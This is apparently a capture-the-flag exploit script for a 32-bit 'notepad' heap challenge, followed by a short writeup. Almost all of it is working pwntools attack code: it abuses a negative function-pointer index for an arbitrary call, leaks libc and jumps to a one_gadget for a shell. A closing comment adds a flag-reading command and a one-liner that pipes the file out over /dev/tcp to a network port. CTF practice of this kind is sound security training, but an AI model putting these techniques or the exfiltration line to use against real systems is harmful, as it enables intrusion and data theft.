from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
# context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./notepad_patched")
    
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

sla("::> ","c")
def add(size,content):
    sla("::> ","a")
    sla("size > ",str(size))
    sla("data > ",content)
def destroy(index):
    sla("::> ","c")
    sla("id > ",str(index))
puts_plt = 0x8048570
free_plt = 0x8048510
# add(8,p32(0xDEADBEEF)) # we use 8 here prevent fgets's null byte
add(8,p32(free_plt)) # We want to free ourselves since free in program NULLs the pointer
add(256,"bbb")
add(4,"aaa")

sla("::> ","b") # Dunno why we need this b again
sla("::> ","b")
sla("id > ","1")
sla("edit (Y/n)","n")
sla("::> ",chr(ord("a") - 4)) # 0xDEADBEEF / Free

sla("::> ","b")
sla("id > ","0")
sla("edit (Y/n)","Y")
sla("content > ",p32(puts_plt)) # Chunk 0's content is now puts_plt

sla("::> ",chr(ord("a"))) # We are in chunk 0, don't execute now

sla("::> ","b")
sla("id > ","1")
sla("edit (Y/n)","n")
sla("::> ",chr(ord("a") - 4)) # puts

libc = l32() - 0x1b27b0
leak("libc",hex(libc))
og = libc + 0x3ac3e
system = libc + 0x3ad80
sla("::> ","b")
sla("id > ","0")
sla("edit (Y/n)","Y")
sla("content > ",p32(og))

sla("::> ",chr(ord("a"))) # Don't execute now
sla("::> ","b")
sla("id > ","1")
sla("edit (Y/n)","n")
if args.GDB:
    gdb.attach(r)
sla("::> ",chr(ord("a") - 4)) # og

r.interactive()

'''
Writeup:
struct note{
    void (*show)(struct note*);
    void (*destroy)(struct note*);
    int rdonly;
    int size;
    char content[size];
}
We want to free ourselves since free in program NULLs the pointer.
Vulneribility: When it calls function, it first calculates the offset of your input and 'a', and calls the function at note[chr-'a'].
However it just checks the chr is >= b or not, so we can use negative offset to call the function pointer in previous note.
Therefore we have arbitrary function call, the rest is just free unsorted bin to get libc leak.
Then we use one_gadget to get shell. Why? Since when we are calling the function our esi is pointing to the GOT address of libc!
It's complicated if you use system since the rdonly has null byte and we can only edit content
Otherwise you need some heap fengshui (I think it's heap overlap) to control "/bin/sh" to argument.
Another way to leak libc is use format string bug.
(In old days we have only system and we may not know what's unsorted bin leak.
In nowadays we have one_gadget and we know unsorted bin leak, it's a lot easier and intuitive now XD.
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''